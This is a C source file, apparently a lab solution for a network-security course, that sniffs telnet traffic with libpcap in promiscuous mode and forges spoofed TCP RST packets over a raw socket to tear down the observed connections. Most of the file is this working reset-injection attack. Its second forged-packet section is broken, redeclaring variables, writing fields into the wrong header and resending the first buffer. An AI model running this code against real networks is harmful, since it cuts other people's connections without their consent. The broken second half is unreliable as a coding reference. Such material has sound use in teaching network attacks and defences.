/*
 * pcap_example.c
 *
 *  Created on: Apr 28, 2016
 *      Author: jiaziyi
 */



#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<pcap.h>
#include <linux/ip.h>
#include <linux/tcp.h>


#include "header.h"



#include "tcp_hijack.h"
#include "header.h"
 
//some global counter
int tcp=0,udp=0,icmp=0,others=0,igmp=0,total=0,i,j;

int main(int argc, char *argv[])
{
	pcap_t *handle;
	pcap_if_t *all_dev, *dev;

	char err_buf[PCAP_ERRBUF_SIZE], dev_list[30][2];
	char *dev_name;
	bpf_u_int32 net_ip, mask;


	//get all available devices
	if(pcap_findalldevs(&all_dev, err_buf))
	{
		fprintf(stderr, "Unable to find devices: %s", err_buf);
		exit(1);
	}

	if(all_dev == NULL)
	{
		fprintf(stderr, "No device found. Please check that you are running with root \n");
		exit(1);
	}

	printf("Available devices list: \n");
	int c = 1;

	for(dev = all_dev; dev != NULL; dev = dev->next)
	{
		printf("#%d %s : %s \n", c, dev->name, dev->description);
		if(dev->name != NULL)
		{
			strncpy(dev_list[c], dev->name, strlen(dev->name));
		}
		c++;
	}



	printf("Please choose the monitoring device (e.g., en0):\n");
	dev_name = malloc(20);
	fgets(dev_name, 20, stdin);
	*(dev_name + strlen(dev_name) - 1) = '\0'; //the pcap_open_live don't take the last \n in the end

	//look up the chosen device
	int ret = pcap_lookupnet(dev_name, &net_ip, &mask, err_buf);
	if(ret < 0)
	{
		fprintf(stderr, "Error looking up net: %s \n", dev_name);
		exit(1);
	}

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = net_ip;
	char ip_char[100];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("NET address: %s\n", ip_char);

	addr.sin_addr.s_addr = mask;
	memset(ip_char, 0, 100);
	inet_ntop(AF_INET, &(addr.sin_addr), ip_char, 100);
	printf("Mask: %s\n", ip_char);

	//Create the handle
	if (!(handle = pcap_create(dev_name, err_buf))){
		fprintf(stderr, "Pcap create error : %s", err_buf);
		exit(1);
	}

	//If the device can be set in monitor mode (WiFi), we set it.
	//Otherwise, promiscuous mode is set
	if (pcap_can_set_rfmon(handle)==1){
		if (pcap_set_rfmon(handle, 1))
			pcap_perror(handle,"Error while setting monitor mode");
	}

	if(pcap_set_promisc(handle,1))
		pcap_perror(handle,"Error while setting promiscuous mode");

	//Setting timeout for processing packets to 1 ms
	if (pcap_set_timeout(handle, 1))
		pcap_perror(handle,"Pcap set timeout error");

	//Activating the sniffing handle
	if (pcap_activate(handle))
		pcap_perror(handle,"Pcap activate error");

	// the the link layer header type
	// see http://www.tcpdump.org/linktypes.html
	header_type = pcap_datalink(handle);

	//BEGIN_SOLUTION
	//	char filter_exp[] = "host 192.168.1.100";	/* The filter expression */
	char filter_exp[] = "dst port 23";
	//	char filter_exp[] = "udp && port 53";
	struct bpf_program fp;		/* The compiled filter expression */

	if (pcap_compile(handle, &fp, filter_exp, 0, net_ip) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	//END_SOLUTION

	if(handle == NULL)
	{
		fprintf(stderr, "Unable to open device %s: %s\n", dev_name, err_buf);
		exit(1);
	}

	printf("Device %s is opened. Begin sniffing with filter %s...\n", dev_name, filter_exp);

	logfile=fopen("log.txt","w");
	if(logfile==NULL)
	{
		printf("Unable to create file.");
	}

	//Put the device in sniff loop
	fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

	if(fd < 0)
	{
		perror("Error creating raw socket ");
		exit(1);
	}

	pcap_loop(handle , -1 , process_packet , NULL);

	pcap_close(handle);
 
	shutdown(fd,SHUT_WR);

	return 0;

}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{
	printf("\n");
	printf("\n");
	printf("a packet is received! %d \n", total++);
	int size = header->len;

	//Finding the beginning of IP header
	struct iphdr *in_iphr;

	print_tcp_packet(buffer, size);

	switch (header_type)
	{
	case LINKTYPE_ETH:
		printf("ETH");
		in_iphr = (struct iphdr*)(buffer + sizeof(struct ethhdr)); //For ethernet
		size -= sizeof(struct ethhdr);
		break;

	case LINKTYPE_NULL:
		printf("NULL");
		in_iphr = (struct iphdr*)(buffer + 4);
		size -= 4;
		break;

	case LINKTYPE_WIFI:
		printf("WIFI");
		in_iphr = (struct iphdr*)(buffer + 57);
		size -= 57;
		break;

	default:
		printf("DEFAULT");	
		fprintf(stderr, "Unknown header type %d\n", header_type);
		exit(1);
	}


	//the tcp header
	struct tcphdr *in_tcph = (struct tcphdr*)(in_iphr + 1);//

	/******************now build the reply using raw IP ************/
	uint8_t send_buf[BUF_SIZE]; //sending buffer
	bzero(send_buf, BUF_SIZE);

	// // /*****************IP header************************/
	 struct iphdr *out_iphdr = (struct iphdr*)send_buf;

	out_iphdr->version=4;
	out_iphdr->ihl=5;
	out_iphdr->tos=0;
	out_iphdr->tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr);
	out_iphdr->id=0;//
	out_iphdr->frag_off=0;
	out_iphdr->ttl=255;
	out_iphdr->protocol=IPPROTO_TCP;
	out_iphdr->check=checksum((unsigned short *)out_iphdr,sizeof(struct iphdr));
	
	out_iphdr->saddr = in_iphr->daddr;
	out_iphdr->daddr = in_iphr->saddr;
	

	/****************TCP header********************/
	struct tcphdr *out_tcph = (struct tcphdr*)(send_buf + sizeof(struct iphdr));
    struct pseudo_tcp_header psh; //pseudo header

	out_tcph->source = in_tcph->dest;
	out_tcph->dest = in_tcph->source;
	out_tcph->seq = in_tcph->ack_seq;
	out_tcph->ack_seq = in_tcph->seq;
	out_tcph->res1 = 0;
	out_tcph->doff = 5; //syn
	out_tcph->fin = 0;
	out_tcph->syn = 0;
	out_tcph->rst = 1;
	out_tcph->psh = 0;
	out_tcph->ack = 0;
	out_tcph->urg = 0;
	out_tcph->ece = 0;
	out_tcph->cwr = 0;
	out_tcph->window = htons(65495);
	out_tcph->check = 0;
	out_tcph->urg_ptr = 0;

	//psd
	psh.source_address=in_iphr->daddr;//
	psh.dest_address=in_iphr->saddr;
	psh.placeholder=0;
	psh.protocol=IPPROTO_TCP;
	psh.tcp_length= htons(sizeof(struct tcphdr));

	char data_checksum[sizeof(struct pseudo_tcp_header)+sizeof(struct tcphdr)];
	char* ptc=data_checksum;
	memset(data_checksum,0,sizeof(data_checksum));

	memcpy (ptc,&psh, sizeof(struct pseudo_tcp_header));
	ptc+=sizeof(struct pseudo_tcp_header);
	memcpy (ptc,out_tcph, sizeof(struct tcphdr));
	out_tcph->check = checksum((unsigned short*)data_checksum, sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr));

	// /************** send out using raw IP socket************/

    // //TODO


	struct sockaddr_in to;
	to.sin_family=AF_INET;
    to.sin_port=in_tcph->source;
	to.sin_addr.s_addr=in_iphr->saddr;

	if (sendto(fd, send_buf, out_iphdr->tot_len, 0, (struct sockaddr *)&to, sizeof(to)) < 0)
	{
		perror("Error sending raw socket ");
		exit(1);
	}

	/******************now build the reply using raw IP ************/
	uint8_t send_buf2[BUF_SIZE]; //sending buffer
	bzero(send_buf2, BUF_SIZE);

	// // /*****************IP header************************/
	 struct iphdr *out_iphdr2 = (struct iphdr*)send_buf2;

	out_iphdr2->version=4;
	out_iphdr2->ihl=5;
	out_iphdr2->tos=0;
	out_iphdr2->tot_len=sizeof(struct iphdr)+sizeof(struct tcphdr);
	out_iphdr2->id=0;//
	out_iphdr2->frag_off=0;
	out_iphdr2->ttl=255;
	out_iphdr2->protocol=IPPROTO_TCP;
	out_iphdr2->check=checksum((unsigned short *)out_iphdr2,sizeof(struct iphdr));
	
	out_iphdr2->saddr = in_iphr->saddr;
	out_iphdr2->daddr = in_iphr->daddr;
	

	/****************TCP header********************/
	struct tcphdr *out_tcph2 = (struct tcphdr*)(send_buf2 + sizeof(struct iphdr));
    struct pseudo_tcp_header psh2; //pseudo header

	out_tcph2->source =in_tcph->source ;
	out_tcph2->dest = in_tcph->dest;
	out_tcph2->seq =in_tcph->seq ;
	out_tcph2->ack_seq =in_tcph->ack_seq ;
	out_tcph2->res1 = 0;
	out_tcph2->doff = 5; //syn
	out_tcph2->fin = 0;
	out_tcph2->syn = 0;
	out_tcph2->rst = 1;
	out_tcph2->psh = 0;
	out_tcph2->ack = 0;
	out_tcph->urg = 0;
	out_tcph->ece = 0;
	out_tcph->cwr = 0;
	out_tcph->window = htons(65495);
	out_tcph->check = 0;
	out_tcph->urg_ptr = 0;

	//psd
	psh.source_address=in_iphr->daddr;//
	psh.dest_address=in_iphr->saddr;
	psh.placeholder=0;
	psh.protocol=IPPROTO_TCP;
	psh.tcp_length= htons(sizeof(struct tcphdr));

	char data_checksum[sizeof(struct pseudo_tcp_header)+sizeof(struct tcphdr)];
	char* ptc=data_checksum;
	memset(data_checksum,0,sizeof(data_checksum));

	memcpy (ptc,&psh, sizeof(struct pseudo_tcp_header));
	ptc+=sizeof(struct pseudo_tcp_header);
	memcpy (ptc,out_tcph, sizeof(struct tcphdr));
	out_tcph->check = checksum((unsigned short*)data_checksum, sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr));

	// /************** send out using raw IP socket************/

    // //TODO


	struct sockaddr_in to;
	to.sin_family=AF_INET;
    to.sin_port=in_tcph->source;
	to.sin_addr.s_addr=in_iphr->saddr;

	if (sendto(fd, send_buf, out_iphdr->tot_len, 0, (struct sockaddr *)&to, sizeof(to)) < 0)
	{
		perror("Error sending raw socket ");
		exit(1);
	}
}


